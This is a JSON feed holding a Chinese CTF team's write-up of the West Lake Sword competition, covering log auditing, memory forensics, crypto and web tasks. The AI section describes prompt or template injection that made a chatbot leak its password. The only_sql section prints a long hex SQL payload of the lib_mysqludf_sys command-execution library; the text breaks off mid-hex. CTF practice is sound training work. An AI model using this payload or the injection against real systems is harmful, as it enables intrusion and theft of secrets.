{
    "version": "https://jsonfeed.org/version/1",
    "title": "Hexo • All posts by \"misc\" category",
    "description": "",
    "home_page_url": "https://nnnpc.github.io",
    "items": [
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91C0deX%E6%88%98%E9%98%9FWP/",
            "title": "西湖论剑C0deX战队WP",
            "date_published": "2024-04-16T05:58:19.059Z",
            "content_html": "<h1 id=\"西湖论剑c0dex战队wp\"><a class=\"markdownIt-Anchor\" href=\"#西湖论剑c0dex战队wp\">#</a> 西湖论剑 C0deX 战队 WP</h1>\n<h3 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc</h3>\n<h4 id=\"2024签到题\"><a class=\"markdownIt-Anchor\" href=\"#2024签到题\">#</a> 2024 签到题</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103436990.png\" alt=\"\"></p>\n<p>根据附件中图片的详细信息发送文字到公众号获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131103550962.png\" alt=\"\"></p>\n<p><strong>DASCTF{gcsis_2024_we_are_ready}</strong></p>\n<h4 id=\"数据安全-easy_tables\"><a class=\"markdownIt-Anchor\" href=\"#数据安全-easy_tables\">#</a> 数据安全 - easy_tables</h4>\n<p>附件得到四张表，大致看了下 pdf 中的说明，大致意思就是需要用前三张表也就是 user、permission、tables 获得每个用户所属组的可工作时间段和可以执行的操作，根据 actionlog 表获得具体工作的时间和实际执行的操作，对照知道哪些进行了违规操作，将每个表中的编号按顺序排列之后的 md5 便是最终 flag</p>\n<p>看了下 actionlog 表发现数据很多，通过脚本进行处理并且筛选出不符合规定的操作</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import re</span><br><span class=\"line\">from datetime import datetime</span><br><span class=\"line\"></span><br><span class=\"line\">class LogProcessor:</span><br><span class=\"line\">    def __init__(self, users_file=&#x27;users.csv&#x27;, actions_file=&#x27;actionlog.csv&#x27;, tables_file=&#x27;tables.csv&#x27;, permissions_file=&#x27;permissions.csv&#x27;):</span><br><span class=\"line\">        self.users_file = users_file</span><br><span class=\"line\">        self.actions_file = actions_file</span><br><span class=\"line\">        self.tables_file = tables_file</span><br><span class=\"line\">        self.permissions_file = permissions_file</span><br><span class=\"line\"></span><br><span class=\"line\">        self.users, self.user_dict = self.extract_user_list()</span><br><span class=\"line\">        self.action_logs = self.extract_actions()</span><br><span class=\"line\">        self.tables, self.table_dict = self.extract_tables()</span><br><span class=\"line\">        self.permissions_list = self.extract_permissions()</span><br><span class=\"line\"></span><br><span class=\"line\">    def is_time_in_ranges(self, time_str, time_ranges):</span><br><span class=\"line\">        target_time = datetime.strptime(time_str, &#x27;%H:%M:%S&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        for range_str in time_ranges:</span><br><span class=\"line\">            start_time, end_time = map(lambda x: datetime.strptime(x, &#x27;%H:%M:%S&#x27;), range_str.split(&#x27;~&#x27;))</span><br><span class=\"line\">            if start_time &lt;= target_time &lt;= end_time:</span><br><span class=\"line\">                return True</span><br><span class=\"line\"></span><br><span class=\"line\">        return False</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_sql_operation_type(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\b(insert|delete|update|select)\\b&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return match.group(1).upper()</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_table_name_from_sql(self, sql_statement):</span><br><span class=\"line\">        pattern = re.compile(r&#x27;\\bFROM\\b\\s+([^\\s;]+)|\\bJOIN\\b\\s+([^\\s;]+)|\\bUPDATE\\b\\s+([^\\s;]+)|\\bINTO\\b\\s+([^\\s;]+)|\\bMERGE\\b\\s+([^\\s;]+)|\\bTABLE\\b\\s+([^\\s;]+)&#x27;, re.IGNORECASE)</span><br><span class=\"line\">        match = pattern.search(sql_statement)</span><br><span class=\"line\"></span><br><span class=\"line\">        if match:</span><br><span class=\"line\">            return next(group for group in match.groups() if group is not None)</span><br><span class=\"line\"></span><br><span class=\"line\">        return None</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_user_list(self):</span><br><span class=\"line\">        user_file = open(self.users_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = user_file.read()</span><br><span class=\"line\">        users_list = list()</span><br><span class=\"line\">        user_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            user_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            users_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            user_dict[user_info[1]] = int(user_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return users_list, user_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_actions(self):</span><br><span class=\"line\">        action_log_file = open(self.actions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = action_log_file.read()</span><br><span class=\"line\">        log_lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">        return log_lines</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_tables(self):</span><br><span class=\"line\">        tables_file = open(self.tables_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        content = tables_file.read()</span><br><span class=\"line\">        tables_list = list()</span><br><span class=\"line\">        table_dict = &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        rows = content.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        for row in rows:</span><br><span class=\"line\">            table_info = row.split(&#x27;,&#x27;)</span><br><span class=\"line\">            tables_list.append(row.split(&#x27;,&#x27;))</span><br><span class=\"line\">            table_dict[table_info[1]] = int(table_info[0])</span><br><span class=\"line\"></span><br><span class=\"line\">        return tables_list, table_dict</span><br><span class=\"line\"></span><br><span class=\"line\">    def extract_permissions(self):</span><br><span class=\"line\">        permissions_file = open(self.permissions_file, encoding=&#x27;utf-8&#x27;)</span><br><span class=\"line\">        line = permissions_file.read()</span><br><span class=\"line\">        lines = line.split(&#x27;\\n&#x27;)</span><br><span class=\"line\">        permissions_list = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for line in lines:</span><br><span class=\"line\">            pattern = re.compile(r&#x27;(\\w+),(\\w+),(&quot;.*?&quot;|[^,]+),(&quot;.*?&quot;|[^,]+)&#x27;)</span><br><span class=\"line\">            matches = pattern.match(line)</span><br><span class=\"line\"></span><br><span class=\"line\">            if matches:</span><br><span class=\"line\">                group1 = matches.group(1)</span><br><span class=\"line\">                group2 = matches.group(2)</span><br><span class=\"line\"></span><br><span class=\"line\">                operations_str = matches.group(3)</span><br><span class=\"line\">                operations_list = operations_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in operations_str else [operations_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                numbers_str = matches.group(4)</span><br><span class=\"line\">                numbers_list = numbers_str.strip(&#x27;\\&quot;&#x27;).split(&#x27;,&#x27;) if &#x27;\\&quot;&#x27; in numbers_str else [numbers_str]</span><br><span class=\"line\"></span><br><span class=\"line\">                permissions_list.append([group1, group2, operations_list, numbers_list])</span><br><span class=\"line\"></span><br><span class=\"line\">        return permissions_list</span><br><span class=\"line\"></span><br><span class=\"line\">    def process_actions(self):</span><br><span class=\"line\">        result_flags = []</span><br><span class=\"line\"></span><br><span class=\"line\">        for logline in self.action_logs:</span><br><span class=\"line\">            values = logline.split(&#x27;,&#x27;, 3)</span><br><span class=\"line\">            if values[1] in self.user_dict.keys():</span><br><span class=\"line\">                tuser = self.users[self.user_dict[values[1]] - 1]</span><br><span class=\"line\">                tpermissions = self.permissions_list[int(tuser[3]) - 1]</span><br><span class=\"line\">                sql_head = tpermissions[2]</span><br><span class=\"line\">                table_pass = tpermissions[3]</span><br><span class=\"line\"></span><br><span class=\"line\">                table_name = self.extract_table_name_from_sql(values[3])</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\"></span><br><span class=\"line\">                if str(self.table_dict[table_name]) in table_pass:</span><br><span class=\"line\">                    sql_type = self.extract_sql_operation_type(values[3]).lower()</span><br><span class=\"line\">                    if sql_type in sql_head:</span><br><span class=\"line\">                        time_ranges = [item.replace(&#x27;&quot;&#x27;, &#x27;&#x27;) for item in ttable[2:]]</span><br><span class=\"line\">                        datetime_object = datetime.strptime(values[2], &#x27;%Y/%m/%d %H:%M:%S&#x27;)</span><br><span class=\"line\">                        time_only = datetime_object.time()</span><br><span class=\"line\"></span><br><span class=\"line\">                        if self.is_time_in_ranges(str(time_only), time_ranges):</span><br><span class=\"line\">                            pass</span><br><span class=\"line\">                        else:</span><br><span class=\"line\">                            son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                            result_flags.append(son)</span><br><span class=\"line\">                    else:</span><br><span class=\"line\">                        son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                        result_flags.append(son)</span><br><span class=\"line\">                else:</span><br><span class=\"line\">                    son = tuser[0] + &#x27;_&#x27; + tpermissions[0] + &#x27;_&#x27; + str(self.table_dict[table_name]) + &#x27;_&#x27; + values[0]</span><br><span class=\"line\">                    result_flags.append(son)</span><br><span class=\"line\">                ttable = self.tables[self.table_dict[table_name] - 1]</span><br><span class=\"line\">            else:</span><br><span class=\"line\">                son = &#x27;0_0_0_&#x27; + values[0]</span><br><span class=\"line\">                result_flags.append(son)</span><br><span class=\"line\"></span><br><span class=\"line\">        return result_flags</span><br><span class=\"line\"></span><br><span class=\"line\">    def custom_sort(self, item):</span><br><span class=\"line\">        p = item.split(&#x27;_&#x27;)</span><br><span class=\"line\">        return tuple(map(int, p))</span><br><span class=\"line\"></span><br><span class=\"line\">    def print_sorted_list(self, sorted_list):</span><br><span class=\"line\">        for i in sorted_list:</span><br><span class=\"line\">            print(i, end=&#x27;&#x27;)</span><br><span class=\"line\">            print(&#x27;,&#x27;, end=&#x27;&#x27;)</span><br><span class=\"line\"></span><br><span class=\"line\">    def main(self):</span><br><span class=\"line\">        result_flags = self.process_actions()</span><br><span class=\"line\"></span><br><span class=\"line\">        sorted_list = sorted(result_flags, key=self.custom_sort)</span><br><span class=\"line\">        self.print_sorted_list(sorted_list)</span><br><span class=\"line\"></span><br><span class=\"line\">if __name__ == &quot;__main__&quot;:</span><br><span class=\"line\">    log_processor = LogProcessor()</span><br><span class=\"line\">    log_processor.main()</span><br></pre></td></tr></table></figure>\n<p>将每个表格中的表头去除运行脚本进行处理得到</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0_0_0_6810,0_0_0_8377,6_14_91_6786,7_64_69_3448,9_18_61_5681,30_87_36_235,31_76_85_9617,49_37_30_8295,75_15_43_8461,79_3_15_9011</span><br></pre></td></tr></table></figure>\n<p>md5 之后得到 flag</p>\n<p><strong>271b1ffebf7a76080c7a6e134ae4c929</strong></p>\n<h4 id=\"easy_rawraw\"><a class=\"markdownIt-Anchor\" href=\"#easy_rawraw\">#</a> easy_rawraw</h4>\n<p>得到附件，一个加密压缩包，一个内存 raw 文件，需要进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112328731.png\" alt=\"\"></p>\n<p>首先 passware 爆破得到用户密码 das123admin321，发现不是压缩包密码，利用 vol 对 raw 文件进行取证</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131112840314.png\" alt=\"\"></p>\n<p>filescan 过滤 zip 得到了 pass.zip，dump 下来爆破压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113001517.png\" alt=\"\"></p>\n<p>解开得到都是 md5 的密码本，最终利用 winhex 直接对 raw 文件进行搜索得到了压缩包密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113231879.png\" alt=\"\"></p>\n<p>DasrIa456sAdmIn987，后续发现可以 strings 进行 grep 更快一些</p>\n<p>解压出来 veracrypt 进行挂载，密码本作为 keyfile</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113636740.png\" alt=\"\"></p>\n<p>用户密码 das123admin321 作为解开表格的密码</p>\n<p>搜索 DAS 得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131113748604.png\" alt=\"\"></p>\n<p><strong>DASCTF{5476d4c4ade0918c151aa6dcac12d130}</strong></p>\n<h3 id=\"ai\"><a class=\"markdownIt-Anchor\" href=\"#ai\">#</a> AI</h3>\n<h4 id=\"ai-回声海螺\"><a class=\"markdownIt-Anchor\" href=\"#ai-回声海螺\">#</a> AI - 回声海螺</h4>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114007683.png\" alt=\"\"></p>\n<p>发现输入框有点眼熟，尝试输入一些字，发现会有三遍的回声</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114145572.png\" alt=\"\"></p>\n<p>尝试一下模板注入带出 password</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115329843.png\" alt=\"\"></p>\n<p>在几次尝试之后得到了密码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131115405274.png\" alt=\"\"></p>\n<p>由于是复现环境，所以并没有弹窗出 flag，在比赛期间弹窗得到 flag</p>\n<h3 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> Crypto</h3>\n<h4 id=\"0r1cle\"><a class=\"markdownIt-Anchor\" href=\"#0r1cle\">#</a> 0r1cle</h4>\n<p>非预期，在输入 65 个左右的 0 之后获得 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/image-20240131114633396.png\" alt=\"\"></p>\n<h3 id=\"web\"><a class=\"markdownIt-Anchor\" href=\"#web\">#</a> Web</h3>\n<h4 id=\"only_sql\"><a class=\"markdownIt-Anchor\" href=\"#only_sql\">#</a> only_sql</h4>\n<p>使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2MwY2MvZmFrZU15c2FsL2Jsb2IvbWFzdGVyL2Zha2VNeXNxbFNlcnZlci5weQ==\"> https://github.com/c0cc/fakeMysal/blob/master/fakeMysqlServer.py</span> 配合 vps 读源码，拿到账密和数据库连接即可 root：1q2w3e4r5t!@#</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1706594062001-fe3a09c2-c4fa-4ef4-970d-ab5d211bf405.png\" alt=\"\" title=\"fig:\">执行</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">select unhex(&#x27;7f454c4602010100000000000000000003003e0001000000a00b0000000000004000000000000000882c0000000000000000000040003800070040001c001b000100000005000000000000000000000000000000000000000000000000000000d416000000000000d41600000000000000002000000000000100000006000000101e000000000000101e200000000000101e2000000000007802000000000000800200000000000000002000000000000200000006000000201e000000000000201e200000000000201e200000000000c001000000000000c00100000000000008000000000000000400000004000000c801000000000000c801000000000000c80100000000000024000000000000002400000000000000040000000000000050e574640400000004140000000000000414000000000000041400000000000094000000000000009400000000000000040000000000000051e574640600000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000052e5746404000000101e000000000000101e200000000000101e200000000000f001000000000000f0010000000000000100000000000000040000001400000003000000474e55005c08ddf79a6da5143daa80e4a7efb410a96c4a44000000001100000012000000020000000700000080080248811944c91ca440039804688312000000140000001500000017000000180000001a0000001d0000001f000000000000002000000000000000210000002200000023000000240000002500000000000000ce2cc0ba673c7690ebd3ef0e78722788b98df10ed971581ca868be12bbe3927c7e8b92cdc2f9bfba1f7066a9745bb073371974ec4345d5ecc5a62c1cc3138aff3b9fd4a0ad73d1c50b5911feab5fbe1200000000000000000000000000000000000000000000000000000000cd0000001200000000000000000000000000000000000000fe00000012000000000000000000000000000000000000007c0100001200000000000000000000000000000000000000160000002000000000000000000000000000000000000000120100001200000000000000000000000000000000000000d400000012000000000000000000000000000000000000009101000012000000000000000000000000000000000000004001000012000000000000000000000000000000000000008a01000012000000000000000000000000000000000000008401000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000000b0100001200000000000000000000000000000000000000e800000012000000000000000000000000000000000000007401000012000000000000000000000000000000000000006e01000012000000000000000000000000000000000000003200000020000000000000000000000000000000000000004c00000022000000000000000000000000000000000000000301000012000c00fe0f000000000000da000000000000005501000012000c0048120000000000000b000000000000001000000012000d00f81300000000000000000000000000009300000012000c000c0d0000000000006b000000000000002101000012000900900a0000000000000000000000000000b301000010001700882020000000000000000000000000003701000012000c007e110000000000002f00000000000000bf0100001000170090202000000000000000000000000000b600000012000c00080e0000000000000b00000000000000c500000012000c00130e00000000000063000000000000004701000012000c00ad110000000000009b000000000000007600000012000c00010d0000000000000b00000000000000a900000012000c00770d0000000000009100000000000000ac01000010001600882020000000000000000000000000002701000012000c0073110000000000000b00000000000000db00000012000c00760e0000000000005c010000000000001901000012000c00d8100000000000009b000000000000005b00000012000c007a0c0000000000008700000000000000ef00000012000c00d20f0000000000002c000000000000006501000012000c005312000000000000a301000000000000005f5f676d6f6e5f73746172745f5f005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65006c69625f6d7973716c7564665f7379735f696e666f5f696e6974006c69625f6d7973716c7564665f7379735f696e666f5f6465696e6974006c69625f6d7973716c7564665f7379735f696e666f007379735f6765745f696e6974007379735f6765745f6465696e6974007379735f67657400676574656e76007374726c656e007379735f7365745f696e6974006d616c6c6f63007379735f7365745f6465696e69740066726565007379735f736574006d656d63707900736574656e76007379735f657865635f696e6974007379735f657865635f6465696e6974007379735f657865630073797374656d007379735f6576616c5f696e6974007379735f6576616c5f6465696e6974007379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f7365005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000020002000200000002000200030002000200020000000400020002000200000002000100010001000100010001000100010001000100010001000100010001000100010001000100010000000000000001000300a201000010000000000000009491960600000400c4010000100000001469690d00000300cf01000010000000751a690900000200d901000000000000101e2000000000000800000000000000700c000000000000181e2000000000000800000000000000300c000000000000802020000000000008000000000000008020200000000000e01f20000000000006000000040000000000000000000000e81f200000000000060000000b0000000000000000000000f01f20000000000006000000100000000000000000000000f81f200000000000060000001100000000000000000000001820200000000000070000000100000000000000000000002020200000000000070000000200000000000000000000002820200000000000070000000300000000000000000000003020200000000000070000000500000000000000000000003820200000000000070000000600000000000000000000004020200000000000070000000700000000000000000000004820200000000000070000000800000000000000000000005020200000000000070000000900000000000000000000005820200000000000070000000a00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000000d00000000000000000000007020200000000000070000000e00000000000000000000007820200000000000070000000f00000000000000000000004883ec08488b054d1520004885c07402ffd04883c408c3000000000000000000ff3552152000ff25541520000f1f4000ff25521520006800000000e9e0ffffffff254a1520006801000000e9d0ffffffff25421520006802000000e9c0ffffffff253a1520006803000000e9b0ffffffff25321520006804000000e9a0ffffffff252a1520006805000000e990ffffffff25221520006806000000e980ffffffff251a1520006807000000e970ffffffff25121520006808000000e960ffffffff250a1520006809000000e950ffffffff2502152000680a000000e940ffffffff25fa142000680b000000e930ffffffff25f2142000680c000000e920ffffffff256214200066900000000000000000488d3de114200055488d05d91420004839f84889e57419488b05221420004885c0740d5dffe0662e0f1f8400000000005dc30f1f4000662e0f1f840000000000488d3da1142000488d359a142000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05e11320004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d5114200000752f48833db713200000554889e5740c488b3d32142000e83dffffffe848ffffffc60529142000015dc30f1f8000000000f3c3660f1f440000554889e55de966ffffff554889e548897de8488975e0488955d8488b45e08b0085c07463488b45d848ba4e6f20617267756d48b9656e747320616c6c4889104889480848be6f7765642028756448bf663a206c69625f6d488970104889781848ba7973716c7564665f48b97379735f696e666f488950204889482866c740302900c645ff01eb04c645ff000fb645ff5dc3554889e548897df8905dc3554889e548897df8488975f0488955e848894de04c8945d84c894dd0488b45e848ba6c69625f6d79737148b96c7564665f7379734889104889480848be2076657273696f6e48897010c7401820302e3066c7401c2e33c6401e00488b45e048c7001e000000488b45e85dc3554889e548897df8488975f0488955e8488b45f08b0083f801751c488b45f0488b40088b0085c0750e488b45f8c60001b800000000eb58488b45e848ba457870656374656448b92065786163746c794889104889480848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec4048897de8488975e0488955d848894dd04c8945c84c894dc0488b45e0488b4010488b004889c7e87afcffff488945f848837df8007509488b45c8c60001eb16488b45f84889c7e89afcffff4889c2488b45d0488910488b45f8c9c3554889e54883ec2048897df8488975f0488955e8488b45f08b0083f8027448488b45e848be457870656374656448bf2065786163746c794889304889780848b92074776f2061726748894810c74018756d656e66c7401c7473c6401e00b801000000e9f3000000488b45f0488b40088b0085c07453488b45e848be457870656374656448bf20737472696e67204889304889780848ba7479706520666f7248b9206e616d65207061488950104889481848b972616d657465720048894820b801000000e992000000488b45f0488b40084883c004c70000000000488b45f0488b4018488b10488b45f0488b40184883c008488b004801d04883c0024889c7e8e7fbffff4889c2488b45f848895010488b45f8488b40104885c0753a488b45e848be436f756c64206e6f48bf7420616c6c6f63614889304889780848b97465206d656d6f724889481066c740187900b801000000eb05b800000000c9c3554889e54883ec1048897df8488b45f8488b40104885c07410488b45f8488b40104889c7e8d5faffff90c9c3554889e54883ec3048897de8488975e0488955d848894dd0488b45e8488b4010488945f0488b45e0488b4018488b00488d5001488b45f04801d0488945f8488b45e0488b4018488b10488b45e0488b4010488b08488b45f04889ce4889c7e8effaffff488b45e0488b4018488b10488b45f04801d0c60000488b45e0488b40184883c008488b10488b45e0488b40104883c008488b08488b45f84889ce4889c7e8adfaffff488b45e0488b40184883c008488b10488b45f84801d0c60000488b4df8488b45f0ba010000004889ce4889c7e81cfaffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54883ec2048897df8488975f0488955e848894de0488b45f0488b4010488b004889c7e877f9ffff4898c9c3554889e548897de8488975e0488955d8c745fc00000000488b45e08b0083f801751f488b45e0488b40088b55fc48c1e2024801d08b0085c07507b800000000eb58488b45d848be457870656374656448bf2065786163746c794889304889780848be206f6e652073747248bf696e672074797065488970104889781848b920706172616d65744889482066c740286572c6402a00b8010000005dc3554889e548897df8905dc3554889e54881ec600400004889bdc8fbffff4889b5c0fbffff488995b8fbffff48898db0fbffff4c8985a8fbffff4c898da0fbffff64488b042528000000488945f831c0bf01000000e8bff8ffff488985b8fbffff48c785d8fbffff00000000488b85c0fbffff488b4010488b00488d35390100004889c7e8b0f8ffff488985e0fbffffeb79488d85f0fbffff4889c7e818f8ffff488985e8fbffff488b95d8fbffff488b85e8fbffff4801c2488b85b8fbffff4889d64889c7e85ef8ffff488985b8fbffff488b95b8fbffff488b85d8fbffff488d0c02488b95e8fbffff488d85f0fbffff4889c64889cfe89cf7ffff488b85e8fbffff480185d8fbffff488b95e0fbffff488d85f0fbffffbe000400004889c7e8d3f7ffff4885c00f8563ffffff488b85e0fbffff4889c7e8abf7ffff488b85b8fbffff0fb60084c0740a4883bdb8fbffff00750c488b85a8fbffffc60001eb30488b95b8fbffff488b85d8fbffff4801d0c60000488b85b8fbffff4889c7e834f7ffff4889c2488b85b0fbffff488910488b85b8fbffff488b4df86448330c25280000007405e81cf7ffffc9c300004883ec084883c408c3720000011b033b9000000011000000acf6ffffac0000008cf7ffffd400000076f8ffffec000000fdf8ffff0c01000008f9ffff2c01000073f9ffff